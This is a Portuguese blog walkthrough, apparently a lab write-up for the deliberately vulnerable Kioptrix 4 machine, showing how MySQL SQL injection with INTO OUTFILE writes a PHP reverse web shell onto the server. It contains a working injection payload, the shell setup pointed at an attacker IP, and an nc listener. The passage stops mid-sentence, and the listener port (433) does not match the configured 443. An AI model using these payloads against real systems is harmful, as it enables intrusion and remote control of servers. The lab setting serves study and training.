<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- iOS Safari -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
  <meta name="theme-color" content="#FFFFFF">
  <meta property="og:title" content="SQLi(injection) com Reverse Shell no Kiotprix4">
    <meta name="description" content="Algumas formas de ganhar shell reverso usando SQLi">
  <meta property="og:description" content="Algumas formas de ganhar shell reverso usando SQLi">
    <meta property="og:type" content="blog">
  <title>SQLi(injection) com Reverse Shell no Kiotprix4</title>
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
  <link rel="stylesheet" type="text/css"
    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
  <link rel="stylesheet" type="text/css" href="css/notablog.css">
  <link rel="stylesheet" type="text/css" href="css/theme.css">
  <style>
    :root {
      font-size: 18px;
    }

    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
    <a href="index.html">
      <div class="Navbar__Btn"><span>üìñ</span> <span>Home</span></div>
    </a>
                                                                    <span class="Navbar__Delim">&centerdot;</span>
    <a href="about.html">
      <div class="Navbar__Btn"><span>‚ÅâÔ∏è</span> <span>About</span></div>
    </a>
          </nav>
  <header class="Header">
          <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
        <h1 class="Header__Title">SQLi(injection) com Reverse Shell no Kiotprix4</h1>
            <div class="DateTagBar">
                <span class="DateTagBar__Item DateTagBar__Date">Posted on Thu, Jul 30, 2020</span>
                          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--default">
            <a href="tag/sqli.html">sqli</a>
          </span>
                  </div>
          </header>
      <article id="https://www.notion.so/c0794964904747119f97f02e16868018" class="PageRoot"><div id="https://www.notion.so/cc020053fde649ef9571a02b715bf2b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Este √© um simples artigo s√≥ para mostrar algumas possibilidades que aprendi sobre como escrever arquivos em um servidor MySQL utilizando SQLi.</span></span></p></div><div id="https://www.notion.so/49db26a55cc244e588f2e2d1b47ce2d7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Tudo passa pelo &quot;comando&quot; </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">INTO OUTFILE</strong></span><span class="SemanticString"> no caso do MySQL. </span></span></p></div><div id="https://www.notion.so/b785d42846764fd68b41945d4dffc3ba" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">O que ele diz a grosso modo √© : escreva o resultado desse SQL em um arquivo no filesystem. üòÆüòÆüòÆüòÆüòÆüòÆüòÆ. Pois √©. Pois √©. Pois √©.</span></span></p></div><div id="https://www.notion.so/9e4bd11dd2f545a2ac1117d4b493ac02" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ent√£o, se temos uma possibilidade de SQLi e atrav√©s dela podemos escrever arquivos no servidor, as possibilidades e a porta da esperan√ßa se abrem, concordam ?</span></span></p></div><div id="https://www.notion.so/3d284e1db9c549feaf57cf8f9b0227d9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Para este artigo utilizaremos como base uma aplica√ß√£o vulner√°vel a SQLinjection. </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">O formul√°rio de login do LigGoat da m√°quina Kiotprix 4.</strong></span></span></p></div><blockquote id="https://www.notion.so/8e14d95769f44e4687e6e0cdf2dd5b23" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Inclusive, essa m√°quina √© muito legal de se fazer, e vi alguns walkthrougs de como faz√™-la, mas nenhuma que li usava do SQLi para j√° chegar no Shell com root direto. Depois de ler esse artigo da uma espiadinha no: </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Do SQLi ao Root em um dois passos!</strong></span></span></blockquote><div id="https://www.notion.so/5f394e45d6134830a7c946f1a8fac746" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Objetivo: </strong></span><span class="SemanticString">Escrever um script php que contenha o web shell reverso do pentest monkey, que j√° vem na distro Kali. Chamaremos o arquivo de meu-lindo-shell.php.</span></span></p></div><div id="https://www.notion.so/5cb7fcde5d0349a381e93b6133047700" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h2 id="https://www.notion.so/af5f4cc81bd7470e8c9b5cd698aebc0e" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/af5f4cc81bd7470e8c9b5cd698aebc0e"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Preparando o ambiente </span></span></h2><div id="https://www.notion.so/72a7c7eb8cdf477ca7cc776b18143222" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Dentro do Kali vamos copiar o webshell para nosso diret√≥rio raiz e customizar ele. Precisamos inserir qual √© o nosso IP que esperamos receber o shell.</span></span></p></div><pre id="https://www.notion.so/cded6fef9ffb448a93bff83dff09593c" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#Preparando nosso Web Shell</span>
root@kbca$ <span class="token function">locate</span> webshell <span class="token operator">|</span> <span class="token function">grep</span> revers
/usr/share/webshells/jsp/jsp-reverse.jsp
/usr/share/webshells/perl/perl-reverse-shell.pl
/usr/share/webshells/php/php-reverse-shell.php

root@kbca$ <span class="token function">cp</span> /usr/share/webshells/php/php-reverse-shell.php meu-lindo-shell.php

<span class="token comment"># >>>> Precisamos Substituir o IP e Porta &lt;&lt;&lt;&lt;</span>
root@kbca$ <span class="token function">grep</span> -i <span class="token string">"CHANGE THIS"</span> meu-lindo-shell.php
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span>  // CHANGE THIS
<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>       // CHANGE THIS

<span class="token comment"># >>>> Usando o SED  &lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>
root@kbca$ <span class="token function">sed</span> -i -e <span class="token string">"s/127.0.0.1/192.168.200.3/g"</span> -e <span class="token string">"s/1234/443/g"</span> meu-lindo-shell.php
 
root@kbca$ <span class="token function">grep</span> -i <span class="token string">"CHANGE THIS"</span> meu-lindo-shell.php
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string">'192.168.200.3'</span><span class="token punctuation">;</span>  // CHANGE THIS
<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">443</span><span class="token punctuation">;</span>       // CHANGE THIS</span></span></span></code></pre><div id="https://www.notion.so/5abcc67801d44ab3a88361d26f04faed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a681d6dece0f44a5822f2b37750455f7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Opcionalmente recomend√°vel</strong></em></span><span class="SemanticString">, vamos remover tudo que √© coment√°rio do nosso webshell. Por que ? Para economizar espa√ßo. :D Com o comando abaixo tou pedindo para o sed remover (/d no final) tudo que come√ßar com (ÀÜ) zero ou mais espa√ßos (\s*) seguido de // (\/\/ ‚Äî Parecem chifres mas s√£o / &quot;escapadas&quot; \ pois a barra √© caracter especial) , que √© coment√°rio do php.</span></span></p></div><div id="https://www.notion.so/cddf5a5ce31547bb93fdac0e13874f12" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/ee7238c4de184f8aa7660fecc4544260" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ <span class="token function">sed</span>  -i -e <span class="token string">'/^\s*\/\//d'</span> meu-lindo-shell.php</span></span></span></code></pre><div id="https://www.notion.so/4964c482a1e34f36870cdd5862cd10ea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><blockquote id="https://www.notion.so/abb063986e4840dd83e155d470863903" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Webshell Pronto, bora injetar ele! Vamos lembrar: Nosso IP ser√° o 192.168.200.3 e nossa porta 433. √â interessante que nessa m√°quina ela s√≥ tem permiss√£o de acessar algumas portas externas, ou seja, nada de 4321 </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">(em homenagem ao grande tutor e mestre major √âder Luis)</em></span><span class="SemanticString">, por isso escolhemos a 443.</span></span></blockquote><div id="https://www.notion.so/4ba7f7ea173a4df2ab95d0dc1c7f4387" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h2 id="https://www.notion.so/d2ea3802586b487ab2f3050d49e04346" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/d2ea3802586b487ab2f3050d49e04346"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">PRIMEIRO ATO! FORMA 1</span></span></h2><div id="https://www.notion.so/c5d3d2a3b5094255911e3783d5aff496" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Bem, vamos a primeira forma, que √© como o </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SQLMap</strong></span><span class="SemanticString"> faz! Ele se utiliza </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">&quot;da constru√ß√£o&quot; </em></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">LINES TERMINATED BY</strong></span><span class="SemanticString">para inserir o conte√∫do do arquivo desejado </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">em formato Hexadecimal</strong></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/4f228f505347490ca7543c7ac6a74e06" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8a19cd51642248228769f8480d718e7e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Precisamos ent√£o converter nosso c√≥digo para Hexa. Para isso podemos usar o excelente site canivete su√≠√ßo </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://gchq.github.io/CyberChef/"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">CyberChef</strong></a></span><span class="SemanticString"> ou ent√£o direto na linha de comando com o xxd:</span></span></p></div><pre id="https://www.notion.so/9a8921f990ac4cf0b70051a997c1d8fe" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ xxd <span class="token operator">-</span>plain meu<span class="token operator">-</span>lindo<span class="token operator">-</span>shell<span class="token punctuation">.</span>php <span class="token operator">></span> meu<span class="token operator">-</span>lindo<span class="token operator">-</span>shell<span class="token punctuation">.</span>hex</span></span></span></code></pre><div id="https://www.notion.so/c77232ca20e3465eb853fb13723636b6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Qual a constru√ß√£o utilizada no SQLi ent√£o ?</span></span></p></div><div id="https://www.notion.so/7ac2e54d596747979dd21f1554b58d7e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/115db123f07a4d6db2e02789e1253a38" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&lt;sql injection&gt; LIMIT 0,1 </code></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><code class="SemanticString__Fragment SemanticString__Fragment--Code">INTO OUTFILE</code></strong></mark></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"> &#x27;&lt;nome-do-arquivo&gt;&#x27; </code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><code class="SemanticString__Fragment SemanticString__Fragment--Code">LINES TERMINATED BY</code></mark></strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"> 0x&lt;seu-codigo-hexa-aqui&gt;-- -</code></span></span></p></div><div id="https://www.notion.so/75667daf12e1479c89df57f4a468b01e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/acc7e52d5d134d3bbbaebcb7b593bf64" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Como fica para o nosso caso ? No caso do Knoptrix 4 o campo vulner√°vel √© o mypassword e existe um usu√°rio de nome john.</span></span></p></div><div id="https://www.notion.so/2fa0da1e95314f1b86206543472bfdd4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">SQLi montado e pronto para ser injetado!</span></span></p></div><pre id="https://www.notion.so/967db24ad364408fb739ea76e68e0f72" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>myusername<span class="token operator">=</span>john<span class="token operator">&amp;</span>mypassword<span class="token operator">=</span><span class="token operator">-</span><span class="token number">9334</span>' <span class="token operator">OR</span> <span class="token number">1908</span><span class="token operator">=</span><span class="token number">1908</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span> </span></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span></span></mark></strong></span><span class="SemanticString"><span> <span class="token string">'/var/www/meu-lindo-shell.php'</span> </span></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><span><span class="token keyword">LINES</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span></span></mark></strong></span><span class="SemanticString"><span> <span class="token number">0</span>x</span></span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><span><span class="token number">3</span>c3f7068<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> todo o resto <span class="token keyword">do</span> hexa aqui <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span></span></em></span><span class="SemanticString"><span><span class="token comment">-- -</span>
</span></span></span></code></pre><div id="https://www.notion.so/3485734ee36745bb9759a010449bd968" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><blockquote id="https://www.notion.so/a6e5f0e3b33c420ca3b390051ddb74b4" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Let&#x27;s Bora Injetar!</span></span></blockquote><div id="https://www.notion.so/0636f5eca7594dcebdf985c3a2c47b85" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/408ec9cc71554499be6f8b1f7f7ea34c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Para nos ajudar usaremos o </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Repeater do Burp </strong></span><span class="SemanticString">conforme imagem abaixo. Vejam que estamos mandando para o </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">checklogin.php </em></span><span class="SemanticString">todo o nosso SQLi.</span></span></p></div><div id="https://www.notion.so/cffb18c20c814ee9938899a85f000e37" class="Image Image--PageWidth"><figure><a href="#?width=663"><img src="#?width=663" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/5a9576d2bc6f4fb291d25ae0aa0c27f8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3a5af59daa6c4cb08cf77a40707d61fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Injetando tudo pelo Burp Suite</span></span></p></div><div id="https://www.notion.so/5828e8f87c7c4f618ff454e5477347aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Observe que o resultado √© um erro ! üòÆ </span></span></p></div><div id="https://www.notion.so/21e6e406e86e44afa8c3e0efc7358ac1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ac4d5ee2d7c54da69e9336a2c689074b" class="Image Image--PageWidth"><figure><a href="#?width=677"><img src="#?width=677" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/6762be37253d469ab5b1f11888c92a57" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mas vamos testar! Localmente no kali, em um terminal:</span></span></p></div><pre id="https://www.notion.so/be20b1a1fef644d7b55e45781ada5b34" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root@kbca#nc -lnvp 433</span></span></span></code></pre><div id="https://www.notion.so/572433e212f043a3986a5aae170e0d2a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E no browser vamos chamar o nosso lindo shell.</span></span></p></div><div id="https://www.notion.so/11826b8442b84ce3bc5153b6e79e777f" class="Image Image--PageWidth"><figure><a href="#?width=422"><img src="#?width=422" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2efce3cde9c649f9ae657c58b20bb4ce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8ff6e61fd3f0426abd2aab16fb04307d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E olha o que retorna no nosso Net Gatinho ;D</span></span></p></div><div id="https://www.notion.so/59bfdf834e884c618c83f7e55aabc28a" class="Image Image--PageWidth"><figure><a href="#?width=700"><img src="#?width=700" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/65baca3151fb42b18a490249d6fde65d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f18d7e033d994e9cbefdf2cf87f1100c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Uma considera√ß√£o em rela√ß√£o a esse m√©todo</strong></em></span><span class="SemanticString">. </span></span></p></div><div id="https://www.notion.so/b2e4b9e233304b44b07ad13c08e20457" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Pelo que andei lendo √© necess√°rio que o resultado do SQLi , ou seja, do select inicial traga algum resultado. Ele confia nisso e limita o resultado a apenas uma linha (limit 0,1). Caso o select n√£o traga nenhum resultado, nada ser√° escrito no arquivo e ele ser√° criado com tamanho 0 bytes. A explica√ß√£o para mim √© que a instru√ß√£o t√° dizendo:</span></span></p></div><div id="https://www.notion.so/1fbff0674aaa4e2eacfc3cb74073df94" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><blockquote id="https://www.notion.so/c1302260ab9646da83d750d09871c89e" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">selecione estas coisas aqui (SELECT da aplica√ß√£o) e escreva o resultado neste arquivo aqui (INTO OUTFILE) terminando com estas linhas aqui ( LINES TERMINATED BY)</span></span></blockquote><div id="https://www.notion.so/9028a2abfe3143d8b3d0d1b26ebd5710" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/04e0d7b9a57545ea8b0b1c467b15ab9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Outra considera√ß√£o</strong></span><span class="SemanticString">. </span></span></p></div><div id="https://www.notion.so/28fc8c3c90bf4db69cb57c673f108929" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Como o select trar√° um resultado e inserir√° o c√≥digo que voc√™ passou em hexa ao final, fica evidente que o arquivo conter√° </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">um &quot;lixo&quot; inicial</em></span><span class="SemanticString">. Para scripts php isso n√£o importa, afinal eles foram feitos para serem mesclados com texto puro que represente c√≥digos html, por exemplo:</span></span></p></div><div id="https://www.notion.so/c17e84ada4ce4315858345af72c728e7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/893de92add834c7486d7c8a548382872" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
      Ol√° <span class="token prolog">&lt;?php echo $nome; ?></span> , seja bem vindo(a)
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/c957087dbe464d9eb6dd28c0f435861d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/0a8d5ab7a26f46d0b1f4cf941ec8244b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Observe como ficou o conte√∫do do meu-lindo-shell.php no servidor. Olha o &quot;lixo&quot; na primeira linha correspondente ao resultado do select que a aplica√ß√£o executou quando mandamos o SQLi:</span></span></p></div><div id="https://www.notion.so/85d33c7b53a54835bab44ee5d6566891" class="Image Image--PageWidth"><figure><a href="#?width=583"><img src="#?width=583" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/42e64cd00b954f88be83706cef27398e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h2 id="https://www.notion.so/dff4f5cde21a482da1d27b04236ba2a1" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/dff4f5cde21a482da1d27b04236ba2a1"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SEGUNDO ATO! FORMA 2</strong></span></span></h2><div id="https://www.notion.so/8e33c50bc95c4305973b5d0b818710fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mas se voc√™ precisa que o arquivo n√£o possua nenhum lixo inicial, pois isso pode gerar erro de interpreta√ß√£o do comando que o ler√°, por exemplo, ent√£o teremos que usar outro m√©todo.</span></span></p></div><div id="https://www.notion.so/2af9009bcd9745cbac03cf76dc40a9ab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/af55e513700c4e5bb1b4c908a29d5132" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Uma dificuldade desse m√©todo √© que n√£o d√° para, por exemplo, colocar o c√≥digo em hexadecimal como fizemos acima e ai precisaremos embutir o c√≥digo em texto aberto direto no campo da instru√ß√£o sql, e ai come√ßam os problemas com abre e fechar aspas simples, duplas, etc.</span></span></p></div><div id="https://www.notion.so/15047898d74d40a39526289a9a107dcc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">O que preciso fazer, qual ser√° nosso &quot;payload&quot; do SQLi, qual ser√° a instru√ß√£o?</span></span></p></div><div id="https://www.notion.so/e756c1e067354c799fdff9c069b88764" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3f7600b6c67a40f0838bed0c8ead5eb4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&lt;seu sql injection&gt; limit 0,0 union all select &quot;&lt;codigo1&gt;&quot;,&quot;&lt;codigo2&gt;&quot;,&quot;&lt;codigo3&gt;&quot; </code></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><code class="SemanticString__Fragment SemanticString__Fragment--Code">INTO OUTFILE </code></strong></mark></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&#x27;&lt;nome-do-arquivo&gt;&#x27; -- -</code></span></span></p></div><div id="https://www.notion.so/f7bf8b44ecec4170b75f2cde98654313" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f400e447ebd34444a8db0c555ed4c0b6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A diferen√ßa deste m√©todo para o anterior √© 